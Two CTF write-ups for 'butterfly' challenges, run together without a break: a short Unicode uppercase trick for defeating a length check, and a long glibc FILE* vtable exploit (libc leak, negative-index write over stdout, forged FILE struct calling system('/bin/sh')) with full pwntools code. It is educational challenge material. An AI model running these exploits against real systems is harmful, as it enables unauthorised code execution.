The name ButterFly suggests some kind of buffer overflow. Let's examine the
python script.

In summary,  
- We have a buffer of 32 bytes.  
- There is a hidden password of 16 bytes, which is written on the second half (from the 17th byte) of the buffer.    
- We have to input a password which is written on the buffer from the start.    
- Finally, we get the flag if the first 16 bytes matches the other 16 bytes.

So, the first thing that comes to mind is to overwite the complete buffer with
same bytes, and get the flag.  
But, there's a small restriction. In the `authenticate` function, we have a
check for input length, and it has to be less than 16.  
```py  
if len(user_input) > 16:  
       print('PLEASE INPUT A PASSWORD LESS THAN 16 CHARACTERS LONG')  
       return False  
```  
But, it actually allows input of length upto 16, not strictly less.  
But it doesn't help much, since we can't just input a 32 character string.  
Let's read further.  
```py  
user_input = user_input.upper()  
```  
This part is interesting, and it happens after the length check, and just
before it writes the input to the buffer.  
This makes us think if there is way to change string's length by applying
`str.upper()` method.  

Let's write a quick script to check if its possible.  
I iterate over all utf-8 characters, and check is `char.upper()` is of length
2.  
For iterating over utf-8 characters, I just grabbed some code from github.

```py  
#!/usr/bin/env python

def main():  
   for char in utf8_iterator():  
       if len(char) == 1 and len(char.upper()) == 2:  
           print(char, char.upper())  
           break

# from
https://github.com/Lucas-C/dotfiles_and_notes/blob/master/languages/python/utf8_iterator.py  
import itertools

def byte_iterator(start, end):  
   for i in range(start, end):  
       yield bytes((i,))

def utf8_bytestring_iterator():  
   # Doc: https://en.wikipedia.org/wiki/UTF-8#Description &
https://fr.wikipedia.org/wiki/UTF-8#Description  
   yield from byte_iterator(0x00, 0x80)  # 2^7 characters  
   for i, j in itertools.product(byte_iterator(0xc0, 0xe0),  
                                 byte_iterator(0x80, 0xc0)):  # 2^11 characters  
       yield b''.join((i, j))  # Some additional restrictions could be applied here (start=0xc2)  
   for i, j, k in itertools.product(byte_iterator(0xe0, 0xf0),  
                                    byte_iterator(0x80, 0xc0),  
                                    byte_iterator(0x80, 0xc0)):  # 2^16 characters  
       yield b''.join((i, j, k))  # Some additional restrictions could be applied here  
   for i, j, k, l in itertools.product(byte_iterator(0xf0, 0xf8),  
                                       byte_iterator(0x80, 0xc0),  
                                       byte_iterator(0x80, 0xc0),  
                                       byte_iterator(0x80, 0xc0)):  # 2^21 characters  
       yield b''.join((i, j, k, l))  # Some additional restrictions could be applied here

def utf8_iterator():  
   for bytestring in utf8_bytestring_iterator():  
       try:  
           yield bytestring.decode('utf8')  
       except UnicodeError:  
           pass

if __name__ == '__main__':  
   main()  
```  
And we found one!  Its `ß`. And `'ß'.upper() == 'SS'`.  

We use it to get our final exploit  
```sh  
#!/bin/bash  
python -c "print('ß'*16)" | nc ctf.cscml.zenysec.com 20007    
```# Pwn/butterfly  
HK

*get RIP control*

File: `distribute.tar` (docker tarball)

`nc pwn.darkarmy.xyz 32770`

The library used in the solution code is
[`pwnscripts`](https://github.com/152334H/pwnscripts). Try it!

## Preamble  
This challenge involves a [`FILE*`-based](https://ctf-wiki.github.io/ctf-
wiki/pwn/linux/io_file/introduction/) exploit, something which I've never done
before. A lot of the information in this write-up might sound trivial or
obvious if you're an expert, and some of the explanations here may be
misleading (or even false!).

Nontheless, I've tried my best to keep this writeup factual and informative
for beginners. Moving on:

## Inspection  
```bash  
$ tar tf distribute.tar  
distribute/  
distribute/Dockerfile  
distribute/source/  
distribute/source/butterfly.c  
distribute/source/Makefile  
distribute/libc/  
distribute/libc/ld-linux-x86-64.so.2  
distribute/libc/libc.so.6  
distribute/extras/  
distribute/extras/ynetd  
distribute/extras/flag  
distribute/extras/run.sh  
distribute/challenge_bin/  
distribute/challenge_bin/butterfly  
```  
We get a whole bunch of goodies for this challenge: the binary (`butterfly`),
the source code (under `source/`; shown later), the libc, and a nice docker
container that a player can use for testing.

`source/` has a `Makefile`, and the command shown is rather depressing:  
```makefile  
$ cat distribute/source/Makefile  
all:  
       gcc -Wl,-z,now -fpie -fstack-protector-all -s butterfly.c -o butterfly  
```  
If you don't know what these flags are, have a look at `checksec`:  
```makefile  
   Arch:     amd64-64-little  
   RELRO:    Full RELRO  
   Stack:    Canary found  
   NX:       NX enabled  
   PIE:      PIE enabled  
```  
With that out of the way, we can move on to `butterfly.c` (minified slightly):  
```c  
#include<stdio.h>  
#include<stdlib.h>  
#include<string.h>  
#include<fcntl.h>  
#include<unistd.h>

char *note[0x2];

long int getnum() {  
	char buffer[0x20];  
	read(0,buffer,0x18);  
	return atoll(buffer);  
}  
void setup() {  
	setvbuf(stdin,0,2,0);  
	setvbuf(stdout,0,2,0);  
	setvbuf(stderr,0,2,0);  
	alarm(20);  
}  
void handler() {  
	char buffer[0x100];  
	note[0] = (char *)malloc(0x200);  
	note[1] = (char *)malloc(0x200);  
	printf("I need your name: ");  
	read(0,buffer,0x50);  
	puts(buffer);  
	printf("Enter the index of the you want to write: ");  
	long int idx = getnum();  
	if(idx < 2) {  
		printf("Enter data: ");  
		read(0,note[idx],0xe8);  
	}  
	puts("Bye");  
	_exit(0x1337);  
}  
int main() {  
	setup();  
	handler();  
}  
```  
`main()` calls two functions. `setup()` is nothing unusual — a standard io
unbuffer, with an alarm to kill remotes — whereas `handler()` is the focal
point for this challenge.

In `handler()`, a few things happen.  
1. Two `malloc(0x200)` pointers are written to `.bss` contingously (as the `note[2]` array)  
2. The client is queried for an input of `read(0x50)`  
3. The input is echoed back with `puts()`  
4. The client is queried for a `int64_t` value (of maximum strlen 0x18), `idx`, via the function `getnum()`  
  * `if(idx < 2)`: The client is queried for `read(0xe8)` bytes to write into the buffer at `note[idx]`  
5. A leaving message is printed (`puts("Bye")`), and `_exit()` is called

The most glaring vulnerability here is definitely the `if()` check on step 4.
Since `atoll()` is free to return negative numbers, `idx` can be used to write
to any pointer that happens to lie behind `note[]` in allocated memory. It
might even be possible to write *ahead* of `note[]`, because indexing a
sufficiently negative `note[idx]` (i.e. `-idx>note`) might allow integer
underflow to greater addresses<sup>1</sup>.

There's also a more subtle vulnerability in steps 2 & 3. `puts()` assumes a
`\0`-terminated string, but `read()` doesn't mind if you just leave a dangling
buffer open with no nul-terminator. If we send over *just enough* bytes to
reach the beginning of an already-existing value on the stack, `puts()` will
leak out values until it finds its first `\x00` byte:  
```bash  
$ printf 'AAAAAAAA' | nc pwn.darkarmy.xyz 32770 | xxd  
00000000: 4920 6e65 6564 2079 6f75 7220 6e61 6d65  I need your name  
00000010: 3a20 4141 4141 4141 4141 1087 71ee 657f  : AAAAAAAA..q.e. # <--
0x7f65ee718710 is leaked here!  
00000020: 0a45 6e74 6572 2074 6865 2069 6e64 6578  .Enter the index  
```  
This brings us to step 1 of the exploit:

## Leaking information  
We can whip up a quick bruteforcer to see what addresses we get to leak:  
```python  
from pwn import *  
context.binary = 'distribute/challenge_bin/butterfly'  
for OFF in range(0,0x51,8):  
   p = remote('pwn.darkarmy.xyz', 32770)  
   p.sendafter(': ', 'a'*OFF if OFF else '\n')  
   output = p.recvline()[OFF:-1]  
log.info('%d:%r,%s' % (OFF,output, hex(u64(output.ljust(8,b'\0')))))  
```  
```python  
[*] 0:b'',0x0  
[*] 8:b'\x10Gz\xaeQ\x7f',0x7f51ae7a4710  
[*] 16:b'',0x0  
[*] 24:b'?2\x07\x854\x7f',0x7f348507323f  
[*] 32:b'',0x0  
[*] 40:b'\x10z|\x88\xfc\x7f',0x7ffc887c7a10  
[*] 48:b'',0x0  
[*] 56:b'',0x0  
[*] 64:b'',0x0  
[*] 72:b'\x10G\xf6\xff\x1b\x7f',0x7f1bfff64710  
[*] 80:b'\xe7\xb9J5S\x7f',0x7f53354ab9e7  
```  
This isn't enough information — what do any of these addresses point to?

I made a couple of patches<sup>2</sup> to the `Dockerfile` given, and got the
`telescope` of `handler()`'s stack from `gdb`:  
```python  
0x00007fffffffe538│+0x0008: 0x00007fffffffe678  →  0x00007ffff7a05b97  →
<__libc_start_main+231> mov edi, eax  
0x00007fffffffe540│+0x0010: "hi\n"   ← $rsi             # This is the "I need
your name: " input  
0x00007fffffffe548│+0x0018: 0x00007ffff7ffe710  →  0x00007ffff7ffb000  →
0x00010102464c457f  
0x00007fffffffe550│+0x0020: 0x0000000000000000  
0x00007fffffffe558│+0x0028: 0x00007ffff7de023f  →  <_dl_lookup_symbol_x+319>
add rsp, 0x30  
0x00007fffffffe560│+0x0030: 0x0000000000000000  
0x00007fffffffe568│+0x0038: 0x00007fffffffe6b0  →  0x0000555555554860  →   xor
ebp, ebp  
0x00007fffffffe570│+0x0040: 0x0000000000000000  
0x00007fffffffe578│+0x0048: 0x0000000000000000  
0x00007fffffffe580│+0x0050: 0x0000000000000000  
0x00007fffffffe588│+0x0058: 0x00007ffff7ffe710  →  0x00007ffff7ffb000  →
0x00010102464c457f  
0x00007fffffffe590│+0x0060: 0x00007ffff7b979e7  →  "__vdso_getcpu"  
```  
We'll grab the mappings too, just for a bit more information:  
```  
(gdb) vmmap  
[ Legend:  Code | Heap | Stack ]  
Start              End                Offset             Perm Path  
0x0000555555554000 0x0000555555555000 0x0000000000000000 r-x
/home/challenge/butterfly  
0x0000555555755000 0x0000555555756000 0x0000000000001000 r--
/home/challenge/butterfly  
0x0000555555756000 0x0000555555757000 0x0000000000002000 rw-
/home/challenge/butterfly  
0x0000555555757000 0x0000555555778000 0x0000000000000000 rw- [heap]  
0x00007ffff79e4000 0x00007ffff7bcb000 0x0000000000000000 r-x
/lib/x86_64-linux-gnu/libc-2.27.so  
0x00007ffff7bcb000 0x00007ffff7dcb000 0x00000000001e7000 ---
/lib/x86_64-linux-gnu/libc-2.27.so  
0x00007ffff7dcb000 0x00007ffff7dcf000 0x00000000001e7000 r--
/lib/x86_64-linux-gnu/libc-2.27.so  
0x00007ffff7dcf000 0x00007ffff7dd1000 0x00000000001eb000 rw-
/lib/x86_64-linux-gnu/libc-2.27.so  
0x00007ffff7dd1000 0x00007ffff7dd5000 0x0000000000000000 rw-  
0x00007ffff7dd5000 0x00007ffff7dfc000 0x0000000000000000 r-x
/lib/x86_64-linux-gnu/ld-2.27.so  
0x00007ffff7ff3000 0x00007ffff7ff5000 0x0000000000000000 rw-  
0x00007ffff7ff8000 0x00007ffff7ffb000 0x0000000000000000 r-- [vvar]  
0x00007ffff7ffb000 0x00007ffff7ffc000 0x0000000000000000 r-x [vdso]  
0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000027000 r--
/lib/x86_64-linux-gnu/ld-2.27.so  
0x00007ffff7ffd000 0x00007ffff7ffe000 0x0000000000028000 rw-
/lib/x86_64-linux-gnu/ld-2.27.so  
0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw-  
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]  
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 --x [vsyscall]  
```  
So, there're 5 addresses we get to leak with the limited `read(0x50)`. Three
of these are from `ld-linux` (+0x18, +0x28, +0x58), while the other two are
from the stack (+0x38) and libc (+0x60).

There's a visible lack of a PIE leak here. Our write primitive,
`read(note[idx])`, does its work on a PIE address, so there's not a lot we can
immediately do with the leaked information here.

Let's move back a bit, and see what we can do with `note[]`.

## Write where?  
This part stumped me for the longest time, because I came in knowing
absolutely nothing about `FILE*` exploitation. Let's have a talk about how I
got to know about `FILE*`.

At this point, an ameteur exploiter knows two things:  
1. `0xe8` bytes can be written to any *pointer* that lies behind `note[]`<sup>3</sup>.  
2. From the `vmmap` output, *almost everything* behind `note[]` is **non-writable**. `note[]` is located at `$PIE+0x202050`, and everything behind `$PIE+0x202000` is read-only (or r-x)

`0x202050-0x202000==0x50`. Each element of `note[]` is 8-bytes, so there are
only `0x50/8 == 10` places to write.

We can inspect these 10 places with the Interactive Disassembler:  
```c  
.data:0000000000202000                 dq 0  
.data:0000000000202008 off_202008      dq offset off_202008    ; DATA XREF:
sub_920+17↑r  
LOAD:0000000000202010 qword_202010    dq ?                    ; DATA XREF:
sub_890↑o  
LOAD:0000000000202018                 dq ?  
.bss:0000000000202020 ; FILE *stdout  
.bss:0000000000202028                 align 10h  
.bss:0000000000202030 ; FILE *stdin  
.bss:0000000000202038                 align 20h  
.bss:0000000000202040 ; FILE *stderr  
.bss:0000000000202048 byte_202048     db ?                    ; DATA XREF:
sub_920↑r  
.bss:0000000000202049                 align 10h  
.bss:0000000000202050 ; char *note[2]  
```  
At first, I was interested in the various `XREF`'d values; they pointed
towards mysterious constructor functions that seemed ripe for exploitation.
`sub_920` is even referenced by the `.fini_array`, which made me believe that
it would be executed after `main()`.

That's not-at-all what happens. `handler()` calls `_exit()`, and that skips
ahead of anything the `.fini_array` has to offer.

So, then what? Clearly there's nothing else useful here: the `note[]`s are too
large to overflow, and the i/o `FILE*` pointers — how could they ever be
useful?

## Madness in FILE*

By the process of elimination, the `FILE*` pointers are the only target left
for exploitation.

We'll start with a top-down analysis. The `stdin`, `stdout`, `stderr`
variables on the `.bss` segment are *pointers* to `FILE` structs stored inside
`glibc`. The structure of a `FILE` struct can, once again, be found
[here](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/io_file/introduction/),
but the attention catching part is really the `_IO_FILE_plus` structure that
`FILE` is made of:  
```c  
typedef struct _IO_FILE_plus {  
	_IO_FILE file;  
   IO_jump_t   *vtable; // This is at <FILE_ptr+0xd8> for amd64  
} FILE; // Not exactly what happens, but approximately  
```  
Every `FILE` structure has a `vtable` variable. That `vtable` is a list of
[function pointers](https://en.wikipedia.org/wiki/Function_pointer) to various
I/O methods. So for instance, `puts()` will usually make a call to
`stdout->vtable->_IO_XSPUTN`.

If you're new to this (like I was), all this blabering about `_IO_FILE` is
more likely to confuse you than anything. We'll take a step back, and try out
a bottom-up approach: *how can I use `FILE*` to write an exploit?*

[ctf-wiki](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/io_file/fake-vtable-
exploit/) provides a nice, alluring example of how the vtable can be replaced
with a user-controlled forged vtable to execute arbitrary functions. This
sounds great on paper: since `note[-6]` gives `stdout`, and `read(0xe8)`
*rather convinently*<sup>4</sup> allows us to overwrite the entirety of
`stdout`'s `FILE*` struct, we should be able to overwrite `stdout->vtable`
with a pointer to our *first* input (`"I need your name: `) to *control RIP*,
as the challenge description demands.

Two problems:  
1. Let's say we use the first input to *simultaneously* write a fake vtable<sup>5</sup>, while also leaking out the address of the stack. Even if we achieve that impossibility, where would you jump? Without a simultaneous PIE/libc leak, there's nothing good to switch RIP to.  
2. Arbitrary vtable pointers were [patched out](https://sourceware.org/git/gitweb.cgi?p=glibc.git;a=commitdiff;h=db3476aff19b75c4fdefbe65fcd5f0a90588ba51) in libc 2.24. This challenge uses libc 2.27, so this entire idea is a bust.

So, we can't overwrite the vtable with just anything. If I was doing this
challenge in isolation, I would've definintely given up here.

Fortunately, searching online provided me with
[another](https://dhavalkapil.com/blogs/FILE-Structure-Exploitation/) path for
exploitation. The site describes it better than I can, but in essence:  
1. `puts()` can be made to execute any function pointer within the `__libc_IO_vtables` section of libc  
2. The `_IO_str_overflow` inside of the aforementioned section will (at least, from libc 2.24-2.27) execute a function pointer from `FILE*`, which we are in control of  
3. That function pointer will be executed with an argument (rdi) we can control with `FILE*` as well — no need for `one_gadget`!

And unlike the `ctf-wiki` method, the exploit code provided by the site
*actually worked*<sup>6</sup> on `butterfly`'s libc!

We finally have an exploit method that we can *try* to copy, and *maybe* get
to work.

## Implementation blues  
Before we dig into the madness of `FILE*`, let's start from what we know.

We'll want to jump to `system` (or something for a shell) in libc, so our
first step in the exploit is to leak libc. If you'll recall from two-or-three
sections ago, the libc addressed can be leaked if we just write a full `0x50`
bytes in the first input:  
```python  
from pwnscripts import *  
context.binary = 'distribute/challenge_bin/butterfly'  
context.libc_database = 'libc-database'  
context.libc = 'distribute/libc/libc.so.6'  
LIBC_OFF=0x50  
# The leaked string in gdb showed "__vdso_getcpu", so we'll just grep for
that.  
vdso_magic = next(context.libc.search(b"__vdso_getcpu"))

p = remote('pwn.darkarmy.xyz', 32770)  
p.sendafter(': ', 'a'*LIBC_OFF)  
context.libc.address =
extract_first_bytes(p.recvline()[LIBC_OFF:],6)-vdso_magic  
log.info(hex(context.libc.address))  
```  
This works out well enough — the address has enough trailing zeros to *look*
like a libc base, anyway:  
```python  
[x] Opening connection to pwn.darkarmy.xyz on port 32770  
[x] Opening connection to pwn.darkarmy.xyz on port 32770: Trying 34.77.202.24  
[+] Opening connection to pwn.darkarmy.xyz on port 32770: Done  
[*] 0x7ff2069f2000  
```  
After that, we need to copy whatever black magic we found from our online
searching<sup>7</sup>. The [blog](https://dhavalkapil.com/blogs/FILE-
Structure-Exploitation/) starts off by locating `system` and `/bin/sh`, so
we'll just repeat that:  
```python  
rip = context.libc.symbols['system']  
rdi = context.libc.symbols['str_bin_sh']  
assert rdi % 2 == 0     # Necessary for exploit  
```  
Then, we need a fake vtable address that points to somewhere inside
`__libc_IO_vtables`.  
```python  
io_str_overflow_ptr_addr = context.libc.symbols['_IO_file_jumps'] + 0xd8  
# This next line is broken --- we'll come back to this later.  
fake_vtable_addr = io_str_overflow_ptr_addr - 2*8  
```  
After that, we'll want to create a full rendition of the fake `FILE*`
structure to send to `read(0xe8)`. The blog defines a really long function to
do it, but — as one might expect — there's a `pwntools` helper for that by
now:  
```python  
_lock = context.libc.address + 0x3ecf00 # Magic number: aligned-pointer to an
r/w buffer containing the value b'\0'*8  
fp = FileStructure(_lock)       # This is `bin.symbols['fake_file'] + 0x80` on
the blog  
fp._IO_buf_end = fp._IO_write_ptr = (rdi-100)//2  
fp._IO_write_base = 0  
fp.vtable = fake_vtable_addr  
payload = bytes(fp)+pack(rip)  
```  
With the payload settled, we just have to write it to the `stdout` pointer,
and hope everything works:  
```python  
p.sendlineafter(': ', '-6')     # 0x202050-0x202020  
p.sendafter(': ', payload)  
```  
Considering this is the first time I've ever done a `FILE*` exploit, I really
lucked out on how close my solution was to the right answer:  
```c  
[#0] Id 1, Name: "butterfly", stopped 0x7f2ee404c45f in __GI__IO_default_uflow
(), reason: SIGSEGV  
────────────────────────────────────────── trace
─────────────────────────────────────────────────  
[#0] 0x7f2ee404c45f → __GI__IO_default_uflow(fp=0x7f2ee43aa760
<_IO_2_1_stdout_>)  
[#1] 0x7f2ee404c462 → __GI__IO_default_uflow(fp=0x7f2ee43aa760
<_IO_2_1_stdout_>)  
[#2] 0x7f2ee404c462 → __GI__IO_default_uflow(fp=0x7f2ee43aa760
<_IO_2_1_stdout_>)  
[#3] 0x7f2ee404c462 → __GI__IO_default_uflow(fp=0x7f2ee43aa760
<_IO_2_1_stdout_>)  
[#4] 0x7f2ee404c462 → __GI__IO_default_uflow(fp=0x7f2ee43aa760
<_IO_2_1_stdout_>)  
[#5] 0x7f2ee404c462 → __GI__IO_default_uflow(fp=0x7f2ee43aa760
<_IO_2_1_stdout_>)  
[#6] 0x7f2ee404c462 → __GI__IO_default_uflow(fp=0x7f2ee43aa760
<_IO_2_1_stdout_>)  
[#7] 0x7f2ee404c462 → __GI__IO_default_uflow(fp=0x7f2ee43aa760
<_IO_2_1_stdout_>)  
[#8] 0x7f2ee404c462 → __GI__IO_default_uflow(fp=0x7f2ee43aa760
<_IO_2_1_stdout_>)  
[#9] 0x7f2ee404c462 → __GI__IO_default_uflow(fp=0x7f2ee43aa760
<_IO_2_1_stdout_>)  
```  
An infinite loop? That can't be right.

Doing a little bit of backtracing, I realise where the error lies:  
```c  
[#0] 0x7f2ee404c69d → __GI__IO_default_xsgetn(fp=0x7f2ee43aa760
<_IO_2_1_stdout_>, data=<optimized out>, n=0x3)  
[#1] 0x7f2ee403eaff → _IO_puts(str=0x560377d75c68 "Bye")  
[#2] 0x560377d75b35 → mov edi, 0x1337  
[#3] 0x560377d75b6a → mov eax, 0x0  
```  
`puts()` is calling `__IO_default_xsgetn` instead of `__IO_str_overflow`,
which — if you remember from a long while back — is our key to executing
`system("/bin/sh")`.

The instruction that calls `__IO_default_xsgetn` is none other than this:  
```python  
  0x7f48c65a3af5 <puts+197>       mov    rdx, rbx  
  0x7f48c65a3af8 <puts+200>       mov    rsi, r12  
→ 0x7f48c65a3afb <puts+203>       call   QWORD PTR [r13+0x38]  
  0x7f48c65a3aff <puts+207>       cmp    rbx, rax  
  0x7f48c65a3b02 <puts+210>       jne    0x7f48c65a3ba1 <_IO_puts+369>  
```  
`r13`, if you do the leg-work, is actually the `fake_vtable_addr` we provide
in the exploit code:  
```python  
(gdb) telescope $r13  
0x00007f48c690b368│+0x0000: 0x0000000000000000   ← $r13  
0x00007f48c690b370│+0x0008: 0x00007f48c65b3370  →  <_IO_str_finish+0> push rbx  
0x00007f48c690b378│+0x0010: 0x00007f48c65b2fd0  →  <_IO_str_overflow+0> mov
ecx, DWORD PTR [rdi]       # Need to call this  
0x00007f48c690b380│+0x0018: 0x00007f48c65b2f70  →  <_IO_str_underflow+0> mov
rax, QWORD PTR [rdi+0x28]  
0x00007f48c690b388│+0x0020: 0x00007f48c65b1430  →  <_IO_default_uflow+0> push
rbp  
0x00007f48c690b390│+0x0028: 0x00007f48c65b3350  →  <_IO_str_pbackfail+0> test
BYTE PTR [rdi], 0x8  
0x00007f48c690b398│+0x0030: 0x00007f48c65b1490  →  <_IO_default_xsputn+0> test
rdx, rdx  
0x00007f48c690b3a0│+0x0038: 0x00007f48c65b1640  →  <_IO_default_xsgetn+0> push
r15                     # This is called instead  
0x00007f48c690b3a8│+0x0040: 0x00007f48c65b34a0  →  <_IO_str_seekoff+0> push
r14  
0x00007f48c690b3b0│+0x0048: 0x00007f48c65b1a00  →  <_IO_default_seekpos+0>
push rbx  
```  
We need `_IO_str_overflow`, but we're getting `_IO_default_xsgetn` instead.
The reason for this could not have been more obvious if I had read the blog
clearly on the first pass:  
> Now, if I point the vtable to 0x10 bytes before it, fclose will call
> _IO_str_overflow **(again from gdb)**.  
The calculation of `fake_vtable_addr` in the blog is specific to `fwrite()`.
To get `puts()` to call the right function, we'll increment the offset to the
`fake_vtable` a little bit:  
```python  
io_str_overflow_ptr_addr = context.libc.symbols['_IO_file_jumps'] + 0xd8  
# Now this is correct!  
fake_vtable_addr = io_str_overflow_ptr_addr - 7*8  
```  
With that, we're done!

```python  
[+] Opening connection to pwn.darkarmy.xyz on port 32770: Done  
[*] 0x7f7c6ffcb000  
[*] Switching to interactive mode  
$ ls  
butterfly  
flag  
run.sh  
ynetd  
$ cat flag  
darkCTF{https://www.youtube.com/watch?v=L2C8rVO2lAg}  
$  
```  
Full code, in case you're lazy to read:  
## Code  
```python  
from pwnscripts import *  
context.binary = 'distribute/challenge_bin/butterfly'  
context.libc_database = 'libc-database'  
context.libc = 'distribute/libc/libc.so.6'  
LIBC_OFF=0x50  
vdso_magic = next(context.libc.search(b"__vdso_getcpu"))

p = remote('pwn.darkarmy.xyz', 32770)  
p.sendafter(': ', 'a'*LIBC_OFF)  
context.libc.address =
extract_first_bytes(p.recvline()[LIBC_OFF:],6)-vdso_magic  
log.info(hex(context.libc.address))  
rip = context.libc.symbols['system']  
rdi = context.libc.symbols['str_bin_sh']  
assert rdi % 2 == 0     # Necessary for exploit  
io_str_overflow_ptr_addr = context.libc.symbols['_IO_file_jumps'] + 0xd8  
fake_vtable_addr = io_str_overflow_ptr_addr - 7*8  
_lock = context.libc.address + 0x3ecf00 # Magic number: aligned-pointer to an
r/w buffer containing the value b'\0'*8  
fp = FileStructure(_lock)       # This is `bin.symbols['fake_file'] + 0x80` on
the blog  
fp._IO_buf_end = fp._IO_write_ptr = (rdi-100)//2  
fp._IO_write_base = 0  
fp.vtable = fake_vtable_addr  
payload = bytes(fp)+pack(rip)  
p.sendlineafter(': ', '-6')     # 0x202050-0x202020  
p.sendafter(': ', payload)  
p.interactive()  
```  
## Footnotes  
1. I say "might", because I never bothered to try.  
  `note[]` lies on the end of the binary's PIE memory page. This means that
(useful) addresses higher up than `note` are going to lie on a different
memory page, making it impossible to index higher addresses without having
*two* memory address leaks.  
2. Basically, `apt install python3 gdb`, `RUN` the GEF installation script, and make sure to google for "How to run gdb inside of docker" to get past the ptrace error.  
3. A beginner might try poking around at the `malloc(0x200)` pointers to see if writing anything there can do something interesting. Considering that no heap functions are used after the immediate two `malloc()`s (`_exit()` in particular isn't even going to bother `free()`ing the used addresses), I ignored this possibility.  
4. The coincidence of `0xe8` being 8 bytes larger than `sizeof(FILE)` was what ultimately pushed me to dig so far into `FILE*` exploitation.  
5. This isn't necessarily the only option here. A small pipe dream I thought up of: leaving a fake vtable *in the same memory space* as the fake FILE struct.  
6. Their exploit code being [this](https://dhavalkapil.com/assets/files/FILE-Structure-Exploitation/exploit.py), their binary being [this](https://dhavalkapil.com/assets/files/FILE-Structure-Exploitation/exploit.py). When I say the exploit code "worked", I'm neglecting to mention the quick edits I needed to make to get the binary running on libc2.27.  
7. Try and Ctrl-F the linked blog for `pwntools` to follow along.

Original writeup (https://github.com/IRS-
Cybersec/ctfdump/blob/master/DarkCTF%202020/butterfly.md).